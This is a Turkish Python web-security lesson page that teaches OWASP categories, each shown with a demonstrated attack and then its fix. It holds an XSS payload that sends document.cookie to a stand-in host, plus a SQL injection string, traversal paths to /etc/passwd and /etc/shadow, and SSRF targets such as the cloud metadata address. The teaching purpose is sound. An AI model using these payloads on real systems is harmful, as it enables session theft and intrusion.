@@ -1,0 +1,261 @@
+<!doctype html><html lang="tr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Güvenli Python ve web güvenliği | Kesit Python</title><meta name="description" content="OWASP Top 10 çerçevesinde SQL enjeksiyonu, XSS, CSRF, yol geçişi, güvensiz serileştirme ve gizli bilgi sızıntısını Python koduyla gösterip kapatırsın;…"><link rel="canonical" href="https://ysfdurak.github.io/kesit-python/ders/web-guvenlik/">
+<meta property="og:type" content="article"><meta property="og:locale" content="tr_TR"><meta property="og:site_name" content="Kesit Python"><meta property="og:title" content="Güvenli Python ve web güvenliği"><meta property="og:description" content="OWASP Top 10 çerçevesinde SQL enjeksiyonu, XSS, CSRF, yol geçişi, güvensiz serileştirme ve gizli bilgi sızıntısını Python koduyla gösterip kapatırsın;…"><meta property="og:url" content="https://ysfdurak.github.io/kesit-python/ders/web-guvenlik/"><meta property="og:image" content="https://ysfdurak.github.io/kesit-python/og.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="../../favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/vendor/fonts.css"><link rel="stylesheet" href="../statik.css"><script type="application/ld+json">{"@context":"https://schema.org","@type":"LearningResource","name":"Güvenli Python ve web güvenliği","description":"OWASP Top 10 çerçevesinde SQL enjeksiyonu, XSS, CSRF, yol geçişi, güvensiz serileştirme ve gizli bilgi sızıntısını Python koduyla gösterip kapatırsın;…","inLanguage":"tr","isAccessibleForFree":true,"learningResourceType":"Ders","educationalLevel":"İleri","url":"https://ysfdurak.github.io/kesit-python/ders/web-guvenlik/","isPartOf":{"@type":"Course","name":"Kesit Python","url":"https://ysfdurak.github.io/kesit-python/","provider":{"@type":"Person","name":"Yusuf Durak"}}}</script></head>
+<body class="st"><a class="st-skip" href="#icerik">Ana içeriğe geç</a><header class="st-h"><a class="st-b" href="../../">Kesit Python</a><nav aria-label="Konum"><a href="../">Tüm dersler</a></nav></header>
+<main id="icerik" class="st-m"><span class="st-e">İleri · Web ve API</span><h1>Güvenli Python ve web güvenliği</h1><p class="st-l">OWASP Top 10 çerçevesinde SQL enjeksiyonu, XSS, CSRF, yol geçişi, güvensiz serileştirme ve gizli bilgi sızıntısını Python koduyla gösterip kapatırsın; parolayı tuzlu PBKDF2 ile saklar, HMAC ile imzalı token üretir, KVKK için kişisel veriyi maskeler ve anonimleştirirsin.</p>
+<div class="st-c"><a class="st-p" href="../../#/lesson/web-guvenlik">Uygulamada aç, 28 alıştırmayı çöz</a><span>Ücretsiz, hesap gerekmez, kurulum yok.</span></div>
+<article class="panel theory">
+<h2>Neden önemli?</h2>
+<p>Ilgaz Bank'ın internet şubesinde tek bir parametresiz SQL sorgusu, saldırganın tüm müşteri tablosunu okumasına yeter. Anadolu Market'in yorum alanında kaçırılmamış tek bir HTML çıktısı, başka müşterilerin oturum çerezlerini çalan bir betiğe dönüşebilir. Güvenlik "sonra bakarız" denilecek bir katman değildir; her fonksiyonda verdiğin küçük kararların toplamıdır. Bu derste saldırıyı önce <b>kendi gözünle görecek</b> (sqlite3 ve saf Python ile, tamamen yerel ve zararsız), sonra doğru kalıpla kapatacaksın.</p>
+<div class="warn"><b>Etik çizgi</b>Buradaki teknikleri yalnız kendi kodunda, kendi test ortamında ya da yazılı izin aldığın sistemlerde dene. İzinsiz sisteme saldırı denemesi Türkiye'de de suçtur (TCK 243-245).</div>
+
+<h2>OWASP Top 10: haritayı tanı</h2>
+<p>OWASP (Open Worldwide Application Security Project), web uygulamalarında en sık ve en zararlı açık kategorilerini düzenli olarak yayımlar. Aşağıdaki tablo <b>OWASP Top 10:2025</b> listesini özetler (Kasım 2026'da owasp.org/Top10/2025 sayfasından okundu; Türkçe adlar bizim çevirimiz). 2021 listesine göre iki yeni başlık var: A03 tedarik zinciri, A06:2021 "Açıklı ve eski bileşenler" başlığını genişletir; A10 ise tümüyle yenidir. SSRF ayrı başlık olmaktan çıkıp A01 içine alındı. Sıralama da değişti: yanlış yapılandırma 5.'den 2.'ye çıktı, enjeksiyon 3.'den 5.'ye indi. Eski bir rapor ya da sınav sorusu 2021 numaralarını kullanıyorsa kodun yanındaki yılı oku.</p>
+<div class="tbl-wrap"><table>
+<tr><th>Kod</th><th>Kategori</th><th>Python'da tipik örnek</th><th>Temel savunma</th></tr>
+<tr><td>A01</td><td>Bozuk erişim kontrolü (SSRF dahil)</td><td><code>/hesap/42</code> adresinde sahiplik kontrolü yok; kullanıcının verdiği URL'ye sunucudan istek</td><td>Her istekte "bu kayıt bu kullanıcının mı?"; hedef izin listesi</td></tr>
+<tr><td>A02</td><td>Güvenlik yanlış yapılandırması</td><td>Üretimde <code>DEBUG=True</code></td><td>Güvenli varsayılan, denetim listesi</td></tr>
+<tr><td>A03</td><td>Yazılım tedarik zinciri hataları</td><td>Yıllardır güncellenmemiş ya da doğrulanmadan eklenmiş paket</td><td><code>pip-audit</code>, sürüm sabitleme, güvenilir kaynak</td></tr>
+<tr><td>A04</td><td>Kriptografik hatalar</td><td>Parolayı MD5 ya da düz metin saklamak</td><td>PBKDF2/bcrypt/argon2, TLS</td></tr>
+<tr><td>A05</td><td>Enjeksiyon (SQL, komut, XSS)</td><td>f-string ile SQL, <code>shell=True</code></td><td>Parametre, kaçış, izin listesi</td></tr>
+<tr><td>A06</td><td>Güvensiz tasarım</td><td>Sınırsız deneme hakkı olan şifre sıfırlama</td><td>Tehdit modelleme, oran sınırı</td></tr>
+<tr><td>A07</td><td>Kimlik doğrulama hataları</td><td>Zayıf parola, tahmin edilebilir token</td><td><code>secrets</code>, MFA, kilitleme</td></tr>
+<tr><td>A08</td><td>Yazılım ya da veri bütünlüğü hataları</td><td>Güvenilmeyen veriyi <code>pickle.loads</code></td><td>JSON, imza doğrulama</td></tr>
+<tr><td>A09</td><td>Güvenlik günlüğü ve alarm hataları</td><td>Başarısız girişler loglanmıyor ya da kimse uyarı almıyor</td><td>Yapılandırılmış log, alarm</td></tr>
+<tr><td>A10</td><td>İstisnai durumların yanlış ele alınması</td><td>Yetki servisi hata verince <code>except: pass</code> ile isteği geçirmek; yığın izini kullanıcıya göstermek</td><td>Hata durumunda reddet (fail closed), dar <code>except</code>, merkezi hata işleme</td></tr>
+</table></div>
+
+<h2>SQL enjeksiyonu: görmek ve kapatmak</h2>
+<p>Kullanıcı girdisini SQL metnine yapıştırdığında, girdi <b>veri</b> olmaktan çıkıp <b>kod</b> olur. Aşağıda giriş formu taklidi var; parolayı bilmeden içeri giriliyor.</p>
+<pre class="py">import sqlite3
+db = sqlite3.connect(":memory:")
+db.execute("CREATE TABLE kullanici (ad TEXT, parola TEXT)")
+db.execute("INSERT INTO kullanici VALUES ('ayse', 'Gizli!123')")
+
+def giris_acikli(ad, parola):
+    sql = f"SELECT COUNT(*) FROM kullanici WHERE ad = '{ad}' AND parola = '{parola}'"
+    print("Çalışan SQL:", sql)
+    return db.execute(sql).fetchone()[0] &gt; 0
+
+def giris_guvenli(ad, parola):
+    sql = "SELECT COUNT(*) FROM kullanici WHERE ad = ? AND parola = ?"
+    return db.execute(sql, (ad, parola)).fetchone()[0] &gt; 0
+
+saldiri = "' OR '1'='1"
+print("Açıklı :", giris_acikli("ayse", saldiri))
+print("Güvenli:", giris_guvenli("ayse", saldiri))</pre>
+<p>Parametreli sorguda (<code>?</code> ya da <code>%s</code>) değer sürücüye SQL metninden <b>ayrı</b> gider; içinde tırnak olsa bile hiçbir zaman kod olarak yorumlanmaz. Parametre yalnız <b>değerler</b> için çalışır; tablo ya da sütun adı (ör. kullanıcının seçtiği sıralama alanı) dinamikse onu bir <b>izin listesiyle</b> (allowlist) doğrularsın. ORM'ler (SQLAlchemy, Django) varsayılan olarak parametre kullanır; <code>text()</code> ya da <code>raw()</code> içinde f-string yazdığın anda bu koruma biter. Aynı ilke işletim sistemi komutları için de geçerlidir: <code>subprocess.run(["ping", host])</code> liste biçiminde güvenlidir, <code>shell=True</code> ile metin vermek komut enjeksiyonuna kapı açar.</p>
+
+<h2>XSS ve HTML kaçışı</h2>
+<p>Siteler arası betik çalıştırma (Cross-Site Scripting, XSS), kullanıcı verisinin HTML'e kaçırılmadan basılmasıyla olur. Tarayıcı, yorum alanına yazılmış <code>&lt;script&gt;</code> etiketini sayfanın kodu sanar ve çalıştırır.</p>
+<pre class="py">import html
+from jinja2 import Environment
+
+yorum = '&lt;script&gt;fetch("https://kotu.example/?c=" + document.cookie)&lt;/script&gt;'
+print("Kaçışsız :", "&lt;p&gt;" + yorum + "&lt;/p&gt;")
+print("Kaçışlı  :", "&lt;p&gt;" + html.escape(yorum) + "&lt;/p&gt;")
+
+env = Environment(autoescape=True)
+sablon = env.from_string("&lt;p&gt;{{ ad }} yorum yaptı: {{ yorum }}&lt;/p&gt;")
+print(sablon.render(ad="Ayşe", yorum=yorum))</pre>
+<div class="tbl-wrap"><table>
+<tr><th>Karakter</th><th>Kaçış</th><th>Neden</th></tr>
+<tr><td><code>&lt;</code> <code>&gt;</code></td><td><code>&amp;lt;</code> <code>&amp;gt;</code></td><td>Etiket açılmasın</td></tr>
+<tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td><td>Varlık (entity) karışmasın</td></tr>
+<tr><td><code>"</code> <code>'</code></td><td><code>&amp;quot;</code> <code>&amp;#x27;</code></td><td>Öznitelik değerinden taşmasın</td></tr>
+</table></div>
+<p>Jinja2'de <code>autoescape=True</code> (Flask'ta varsayılan açık), Django şablonlarında otomatik kaçış varsayılandır. Kaçışı <code>|safe</code> ya da <code>Markup()</code> ile kapatmak, "bu veriye güveniyorum" demektir; kullanıcı verisi için asla yapma. Ek savunma katmanı olarak Content-Security-Policy (CSP) başlığı ve çerezlerde <code>HttpOnly</code> kullanılır.</p>
+
+<h2>Parola saklama: özet, tuz, sabit zamanlı karşılaştırma</h2>
+<p>Parola <b>asla</b> düz metin ya da şifrelenmiş (geri çözülebilir) saklanmaz; yavaş, tuzlu bir özet (hash) saklanır. Tuz (salt) her kullanıcı için rastgele üretilir; aynı parolaya sahip iki kullanıcının özetleri farklı olur ve önceden hesaplanmış tablolar işe yaramaz. Yinelemeli (iterated) özet, her tahmini saldırgan için pahalı kılar. MD5 ve tek tur SHA-256 parola için uygun değildir, çünkü çok hızlıdır.</p>
+<pre class="py">import hashlib, hmac, secrets
+
+TUR = 100_000   # gerçekte sha256 için 600 bin civarı önerilir
+
+def parola_ozetle(parola: str) -&gt; str:
+    tuz = secrets.token_bytes(16)
+    ozet = hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, TUR)
+    return "$".join(["pbkdf2_sha256", str(TUR), tuz.hex(), ozet.hex()])
+
+def parola_dogrula(parola: str, kayit: str) -&gt; bool:
+    _, tur, tuz_hex, ozet_hex = kayit.split("$")
+    aday = hashlib.pbkdf2_hmac("sha256", parola.encode(), bytes.fromhex(tuz_hex), int(tur))
+    return hmac.compare_digest(aday.hex(), ozet_hex)
+
+k1, k2 = parola_ozetle("Anadolu2025!"), parola_ozetle("Anadolu2025!")
+print(k1[:40] + "...")
+print("Aynı parola, farklı özet:", k1 != k2)
+print(parola_dogrula("Anadolu2025!", k1), parola_dogrula("anadolu2025!", k1))</pre>
+<p><code>hmac.compare_digest</code> iki değeri <b>sabit zamanda</b> karşılaştırır. Normal <code>==</code> ilk farklı karakterde durur; süre farkını ölçen bir saldırgan doğru öneki karakter karakter tahmin edebilir (zamanlama saldırısı). <code>secrets</code> modülü kriptografik olarak güvenli rastgelelik verir; token, tuz, sıfırlama kodu için <code>random</code> kullanılmaz, çünkü <code>random</code> tahmin edilebilir.</p>
+<pre class="code"># Kendi bilgisayarında: pip install argon2-cffi bcrypt
+from argon2 import PasswordHasher
+ph = PasswordHasher()
+kayit = ph.hash("Anadolu2025!")      # tuz ve parametreler kaydın içinde
+ph.verify(kayit, "Anadolu2025!")      # yanlışsa VerifyMismatchError
+
+import bcrypt
+kayit = bcrypt.hashpw(b"Anadolu2025!", bcrypt.gensalt(rounds=12))
+bcrypt.checkpw(b"Anadolu2025!", kayit)</pre>
+<p>Yeni projede argon2id ya da bcrypt tercih edilir; Django varsayılan olarak PBKDF2 kullanır ve argon2'ye geçmeyi destekler. Standart kütüphaneyle kalman gerekirse <code>pbkdf2_hmac</code> doğru seçimdir.</p>
+
+<h2>İmzalı token ve JWT</h2>
+<p>JWT (JSON Web Token) üç parçadır: <code>başlık.yük.imza</code>; ilk ikisi base64url ile kodlanmış JSON'dur. Yük <b>şifreli değildir</b>, herkes okuyabilir; güvenliği imzadan gelir: sunucu, gizli anahtarla HMAC-SHA256 imzası hesaplar ve gelen token'daki imzayla karşılaştırır. Yükte parola, TC kimlik no gibi gizli veri taşınmaz; <code>exp</code> (son kullanma) alanı mutlaka kontrol edilir.</p>
+<pre class="py">import base64, hashlib, hmac, json
+
+def b64(b: bytes) -&gt; str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+ANAHTAR = b"ortam-degiskeninden-gelen-uzun-rastgele-anahtar"
+baslik = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+yuk = b64(json.dumps({"sub": "M-101", "rol": "musteri", "exp": 1767225600}).encode())
+imza = b64(hmac.new(ANAHTAR, f"{baslik}.{yuk}".encode(), hashlib.sha256).digest())
+token = f"{baslik}.{yuk}.{imza}"
+print(token[:60] + "...")
+# Yük herkes tarafından okunabilir:
+print(json.loads(base64.urlsafe_b64decode(yuk + "==")))</pre>
+<p>Gerçek projede <code>PyJWT</code> kullan (<code>jwt.encode</code>, <code>jwt.decode(token, anahtar, algorithms=["HS256"])</code>). <code>algorithms</code> listesini her zaman açıkça ver; "alg: none" kabul eden doğrulayıcılar tarihin klasik açıklarındandır.</p>
+
+<h2>CSRF ve girdi doğrulama</h2>
+<p>Siteler arası istek sahteciliği (Cross-Site Request Forgery, CSRF), kullanıcı bankada oturum açıkken başka bir sitenin onun tarayıcısına gizlice "havale yap" formu göndertmesidir. Tarayıcı çerezi otomatik eklediği için sunucu isteği meşru sanar. Savunma: durum değiştiren her istek POST/PUT/DELETE olur, formda sunucunun ürettiği ve oturuma bağlı bir <b>CSRF token</b> bulunur, çerezler <code>SameSite=Lax</code> ya da <code>Strict</code> işaretlenir. Django bunu varsayılan yapar, Flask'ta Flask-WTF eklenir. Yalnız Authorization başlığıyla token taşıyan API'ler CSRF'ten büyük ölçüde etkilenmez.</p>
+<p>Girdi doğrulamada kural: <b>izin listesi, yasak listesinden iyidir</b>. "Kötü karakterleri temizlemeye" çalışmak yerine neyin geçerli olduğunu tanımla (uzunluk, karakter kümesi, aralık, biçim) ve geri kalan her şeyi reddet. Pydantic dersinde gördüğün şema doğrulaması bunun en temiz yoludur. Doğrulama sunucuda yapılır; tarayıcıdaki doğrulama yalnız kullanıcı deneyimidir.</p>
+
+<h2>Yol geçişi (path traversal)</h2>
+<p>"Rapor indir" uç noktası dosya adını kullanıcıdan alıyorsa, <code>../../etc/passwd</code> gibi bir ad kök klasörün dışına çıkar. Doğru savunma: yolu birleştir, <code>resolve()</code> ile gerçek yola çevir ve kök klasörün <b>içinde</b> kaldığını <code>is_relative_to</code> ile kontrol et. Metin olarak <code>startswith</code> kontrolü yetmez: <code>/srv/raporlar_gizli</code>, <code>/srv/raporlar</code> ile başlar.</p>
+<pre class="py">from pathlib import Path
+
+KOK = Path("/srv/raporlar").resolve()
+
+def guvenli_yol(ad: str) -&gt; Path:
+    yol = (KOK / ad).resolve()
+    if not yol.is_relative_to(KOK):
+        raise PermissionError(f"izin verilmeyen yol: {ad}")
+    return yol
+
+for ad in ["2025/ocak.csv", "../../etc/passwd", "/etc/shadow", "../raporlar_gizli/x.csv"]:
+    try:
+        print("OK  ", guvenli_yol(ad))
+    except PermissionError as e:
+        print("RED ", e)</pre>
+
+<h2>eval, pickle ve yaml.load: kodu veriyle karıştırma</h2>
+<p><code>eval</code>/<code>exec</code> verilen metni kod olarak çalıştırır; kullanıcıdan gelen "formül" ile sunucunda istediği komutu çalıştırabilir. <code>pickle.loads</code> güvenilmeyen veride keyfi kod çalıştırabilir, çünkü pickle nesne kurarken çağrılacak fonksiyonu verinin içinde taşıyabilir. <code>yaml.load</code> da tam yükleyiciyle Python nesnesi kurabilir.</p>
+<pre class="py">import ast, json, yaml
+
+print(ast.literal_eval("[1, 2, {'a': 3}]"))          # yalnız sabit değerler
+try:
+    ast.literal_eval("__import__('os').getcwd()")
+except ValueError as e:
+    print("literal_eval reddetti:", type(e).__name__)
+
+metin = "sunucu: anadolu\nport: 8080\netiketler: [web, api]"
+print(yaml.safe_load(metin))
+try:
+    yaml.safe_load("!!python/object/apply:os.getcwd []")
+except yaml.YAMLError as e:
+    print("safe_load reddetti:", type(e).__name__)
+print(json.loads('{"tutar": 150.5}'))                 # veri alışverişinde JSON</pre>
+<div class="tbl-wrap"><table>
+<tr><th>Tehlikeli</th><th>Güvenli alternatif</th></tr>
+<tr><td><code>eval(girdi)</code></td><td><code>ast.literal_eval</code>, ya da <code>ast</code> ile sınırlı ifade değerlendirici</td></tr>
+<tr><td><code>pickle.loads(dis_veri)</code></td><td><code>json</code>; pickle yalnız kendi ürettiğin ve imzaladığın veride</td></tr>
+<tr><td><code>yaml.load(metin)</code></td><td><code>yaml.safe_load(metin)</code></td></tr>
+<tr><td><code>subprocess.run(metin, shell=True)</code></td><td><code>subprocess.run(["komut", arg])</code></td></tr>
+<tr><td><code>random.choice</code> ile token</td><td><code>secrets.token_urlsafe(32)</code></td></tr>
+</table></div>
+
+<h2>Bağımlılıklar ve gizli bilgiler</h2>
+<pre class="code">pip install pip-audit bandit
+pip-audit -r requirements.txt     # bilinen açıkları (CVE) listeler
+bandit -r src/                     # kodda eval, shell=True, zayıf hash gibi kalıpları arar
+pip install --require-hashes -r requirements.txt   # paket bütünlüğü</pre>
+<p>Gizli bilgi (API anahtarı, veritabanı parolası, JWT anahtarı) koda ve git'e girmez: ortam değişkeni ya da bir gizli yönetici (Vault, bulut secret manager) kullanılır; <code>.env</code> dosyası <code>.gitignore</code>'a eklenir. Git geçmişine bir kez giren anahtar silinse bile geçmişte kalır; yapılacak şey anahtarı <b>iptal edip yenisini üretmektir</b>. Loglara parola, token, kart numarası yazılmaz; yazılacaksa maskelenir. Hata mesajları kullanıcıya iç ayrıntı (SQL, yığın izi) göstermez.</p>
+
+<h2>KVKK: kişisel veriyi korumak</h2>
+<p>6698 sayılı Kişisel Verilerin Korunması Kanunu (KVKK), kişisel veriyi işleyen her kurumu bağlar. Geliştirici olarak sorumluluğun: <b>veri minimizasyonu</b> (ihtiyacın olmayan alanı toplama), <b>maskeleme</b> (ekranda ve logda <code>123******01</code>), <b>takma adlandırma</b> (pseudonymization: kimliği anahtarlı bir özetle değiştirmek; anahtar olmadan geri dönülemez ama aynı kişi aynı takma adı alır) ve <b>anonimleştirme</b> (kişiyi hiçbir şekilde tanımlanamaz hale getirmek: adı silmek, yaşı aralığa, adresi il düzeyine indirmek). Analiz ve test ortamına üretim verisi bu işlemlerden geçmeden kopyalanmaz.</p>
+<pre class="py">import hmac, hashlib
+
+ANAHTAR = b"kvkk-takma-ad-anahtari"
+
+def maskele_tc(tc: str) -&gt; str:
+    return tc[:3] + "*" * 6 + tc[-2:]
+
+def maskele_eposta(e: str) -&gt; str:
+    ad, alan = e.split("@")
+    return ad[0] + "***@" + alan
+
+def takma_ad(tc: str) -&gt; str:
+    return "K-" + hmac.new(ANAHTAR, tc.encode(), hashlib.sha256).hexdigest()[:10]
+
+def yas_araligi(yas: int) -&gt; str:
+    alt = yas // 10 * 10
+    return f"{alt}-{alt + 9}"
+
+kayit = {"ad": "Ayşe Kaya", "tc": "12345678901", "eposta": "ayse.kaya@example.com", "yas": 34, "il": "İzmir"}
+print("Maskeli :", maskele_tc(kayit["tc"]), maskele_eposta(kayit["eposta"]))
+print("Analiz  :", {"kisi": takma_ad(kayit["tc"]), "yas": yas_araligi(kayit["yas"]), "il": kayit["il"]})
+print("Aynı kişi aynı takma ad:", takma_ad("12345678901") == takma_ad("12345678901"))</pre>
+<div class="tip"><b>Altın kurallar</b>Güvenme, doğrula (girdi). Kaçır (çıktı). Parametrele (sorgu). Özetle ve tuzla (parola). Gizli tut (anahtar). En az yetki ver (hesap, veritabanı kullanıcısı). Logla ama maskele.</div>
+<div class="note"><b>Gerçek işte</b>Bankacılık ve e-ticaret projelerinde kod incelemesinde (code review) güvenlik kontrol listesi kullanılır: SQL'de f-string var mı, şablonda <code>|safe</code> var mı, parola nasıl saklanıyor, endpoint sahiplik kontrolü yapıyor mu, log'a kişisel veri gidiyor mu. CI hattında bandit, pip-audit ve gitleaks gibi araçlar her PR'da çalışır; yüksek önem dereceli bulgu birleştirmeyi durdurur. Sızma testi (penetration test) yılda en az bir kez ve büyük sürümlerden önce yapılır.</div>
+
+<section class="more"><span class="eyebrow">Derinleş</span><p>Derste OWASP haritasını, enjeksiyonu, XSS'i ve parola saklamayı gördün; güvenlik başlıklarına ve SSRF'ye yalnız adıyla değindik. Bu bölüm dört konuyu uygulamaya döküyor: tarayıcıya "nasıl davran" diyen <b>güvenlik başlıkları</b>, sunucunu saldırganın vekiline çeviren <b>SSRF</b>, oturum çerezinin çalınmadan ele geçirildiği <b>oturum sabitleme</b> ve bağımlılık taramasının CI'a bağlanması.</p>
+<h2>Güvenlik başlıkları</h2>
+<p>Her HTTP yanıtına eklenen birkaç başlık, kodda bir hata olsa bile saldırının etkisini sınırlar (derinlemesine savunma).</p>
+<div class="tbl-wrap"><table><tr><th>Başlık</th><th>Örnek değer</th><th>Neyi önler?</th></tr>
+<tr><td><code>Content-Security-Policy</code></td><td><code>default-src 'self'; script-src 'self'; frame-ancestors 'none'</code></td><td>XSS: yalnız izinli kaynaklardan betik çalışır, satır içi betik engellenir</td></tr>
+<tr><td><code>Strict-Transport-Security</code></td><td><code>max-age=31536000; includeSubDomains</code></td><td>HTTPS'ten HTTP'ye düşürme (SSL stripping)</td></tr>
+<tr><td><code>X-Frame-Options</code></td><td><code>DENY</code></td><td>Tıklama hırsızlığı (clickjacking): sayfanın başka sitede iframe içinde açılması</td></tr>
+<tr><td><code>X-Content-Type-Options</code></td><td><code>nosniff</code></td><td>Tarayıcının dosya türünü tahmin edip metni betik olarak çalıştırması</td></tr>
+<tr><td><code>Referrer-Policy</code></td><td><code>strict-origin-when-cross-origin</code></td><td>URL'deki token ve parametrelerin başka sitelere sızması</td></tr>
+<tr><td><code>Set-Cookie</code> bayrakları</td><td><code>Secure; HttpOnly; SameSite=Lax</code></td><td>Çerezin HTTP'den gitmesi, JavaScript ile okunması, CSRF</td></tr></table></div>
+<pre class="code"># Flask: her yanıta başlık ekleyen kanca
+@app.after_request
+def guvenlik_basliklari(yanit):
+    yanit.headers["Content-Security-Policy"] = "default-src 'self'; frame-ancestors 'none'"
+    yanit.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+    yanit.headers["X-Content-Type-Options"] = "nosniff"
+    yanit.headers["X-Frame-Options"] = "DENY"
+    yanit.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    return yanit
+# Django: SECURE_HSTS_SECONDS, SECURE_CONTENT_TYPE_NOSNIFF, X_FRAME_OPTIONS ayarları; CSP için django-csp</pre>
+<p>CSP'yi doğrudan zorlamak eski sayfaları bozabilir; önce <code>Content-Security-Policy-Report-Only</code> ile yalnız raporla, ihlalleri topla, sonra zorla. <code>'unsafe-inline'</code> ve <code>'unsafe-eval'</code> CSP'nin XSS korumasını büyük ölçüde boşa çıkarır. HSTS'i ilk kez açarken <code>max-age</code>'i küçük başlat; tarayıcı bu süre boyunca siteye HTTP ile hiç bağlanmaz.</p>
+<h2>SSRF: sunucunu vekil yapmak</h2>
+<p>Sunucu tarafı istek sahteciliği (Server-Side Request Forgery), kullanıcının verdiği bir URL'ye sunucunun istek atmasıyla ortaya çıkar: "ürün görselini şu adresten içe aktar", "webhook adresin", "PDF'e çevrilecek sayfa". Saldırgan dış adres yerine <code>http://169.254.169.254/</code> (bulut sağlayıcının meta veri servisi, geçici kimlik bilgileri burada), <code>http://localhost:6379</code> (Redis) ya da <code>http://10.0.0.5/admin</code> gibi yalnız iç ağdan erişilebilen adresleri verir. İstek senin sunucundan çıktığı için güvenlik duvarı onu içeriden sayar.</p>
+<pre class="py">import ipaddress, socket
+from urllib.parse import urlsplit
+
+def guvenli_mi(url, cozumle=socket.gethostbyname):
+    parca = urlsplit(url)
+    if parca.scheme not in ("http", "https") or not parca.hostname:
+        return False
+    try:
+        ip = ipaddress.ip_address(cozumle(parca.hostname))
+    except (OSError, ValueError):
+        return False
+    return ip.is_global              # özel, döngü, bağlantı-yerel, ayrılmış adresler False
+
+sahte_dns = {"cdn.anadolu.example": "93.184.216.34", "ic.example": "10.0.0.5"}.get
+for u in ["https://cdn.anadolu.example/a.png", "http://169.254.169.254/latest/meta-data/",
+          "http://ic.example/admin", "file:///etc/passwd", "http://127.0.0.1:6379/"]:
+    print(guvenli_mi(u, lambda h: sahte_dns(h) or h), u)</pre>
+<p>Kural listesi: yalnız <code>http/https</code>; adı DNS ile <b>çözüp IP'yi</b> denetle (ad kontrolü yetmez, <code>ic.example</code> iç IP'ye çözülebilir); mümkünse alan adı izin listesi kullan; yönlendirmeleri (redirect) kapat ya da her adımı yeniden denetle; denetlediğin IP'ye bağlan (DNS yeniden bağlama, DNS rebinding saldırısında ad ikinci sorguda başka IP'ye çözülür); yanıt boyutu ve süresi için sınır koy. Bulutta meta veri servisi için IMDSv2 gibi token zorunlu sürümleri aç.</p>
+<h2>Oturum sabitleme (session fixation)</h2>
+<p>Saldırgan önce siteden kendi oturum kimliğini alır, sonra kurbanın tarayıcısına bu kimliği yerleştirir (URL parametresi, alt alan adından çerez). Kurban giriş yaptığında sunucu <b>aynı kimliği</b> yetkili yapar; saldırgan da elindeki kimlikle kurbanın hesabına girer. Çare basittir: <b>yetki düzeyi değiştiğinde (giriş, yetki yükseltme) oturum kimliğini yenile</b>, eski kimliği geçersiz kıl; çıkışta oturumu sunucu tarafında sil. Django <code>login()</code> bunu kendiliğinden yapar (<code>cycle_key</code>); Flask'ta sunucu taraflı oturumda kimliği elle yenilemen gerekir. Ayrıca oturum kimliğini asla URL'de taşıma ve çerezlerde <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> kullan.</p>
+<h2>Bağımlılık taraması CI'da</h2>
+<p><code>pip-audit</code> kurulu paketleri bilinen açık veritabanına (PyPI Advisory, OSV) karşı tarar. kalite-ci dersindeki iş akışına bir adım olarak eklenir; açık bulunursa iş kırmızı olur. Dependabot ya da Renovate, güncellemeleri otomatik PR olarak açar.</p>
+<pre class="code">- name: Bağımlılık taraması
+  run: |
+    pip install pip-audit
+    pip-audit -r requirements.txt --strict --desc</pre>
+<div class="note"><b>Gerçek işte</b>Sızma testi (pentest) raporlarının ilk sayfasında çoğunlukla eksik güvenlik başlıkları ve çerez bayrakları yer alır; bunlar en ucuz düzeltmelerdir. SSRF ise bulut ortamlarında kimlik bilgisi sızıntısına yol açtığı için en pahalı bulgular arasındadır. Kod incelemesinde "kullanıcıdan gelen URL'ye istek atılıyor mu?" sorusu ayrı bir madde olmalı.</div></section><section class="deep"><span class="eyebrow">Uzmanlaş</span>
+<h3>Tehdit modelleme</h3>
+<p>Kod yazmadan önce sor: varlıklarımız neler (müşteri verisi, para transferi), kim saldırabilir, hangi giriş noktaları var, en kötü senaryo ne? STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) her bileşen için bir kontrol listesi verir.</p>
+<h3>Derinlemesine savunma</h3>
+<p>Tek önleme güvenme. Parametreli sorgu + en az yetkili veritabanı kullanıcısı + WAF + izleme. Güvenlik başlıkları (<code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Content-Type-Options: nosniff</code>), oturum çerezlerinde <code>Secure; HttpOnly; SameSite</code>, giriş ve şifre sıfırlamada oran sınırlama (rate limiting) ve hesap kilitleme, yetki kontrollerinde "varsayılan reddet".</p>
+<h3>Kriptografiyi kendin icat etme</h3>
+<p>Kendi şifreleme algoritmanı yazma; <code>cryptography</code> paketinin yüksek seviyeli <code>Fernet</code> API'si gibi denetlenmiş araçları kullan. Bu derste HMAC ile imza yazmamızın amacı mekanizmayı anlamaktır; üretimde PyJWT, itsdangerous gibi olgun kütüphaneler tercih edilir.</p>
+</section>
+</article>
+<div class="st-c"><a class="st-p" href="../../#/lesson/web-guvenlik">Alıştırmalara geç (28)</a></div>
+<nav class="st-n" aria-label="Ders sırası"><a href="../orkestrasyon/">← İş akışı orkestrasyonu: cron, DAG ve Airflow</a><a href="../yapay-zeka-ile-kod/">Yapay zekâ asistanıyla Python yazmak →</a></nav></main>
+<footer class="st-f">Kesit ücretsiz bir eğitim ve portföy projesidir. Veri setleri hayalidir. <a href="/">Kesit ana sayfası</a> · <a href="/vaka/">Nasıl yapıldı</a></footer></body></html>
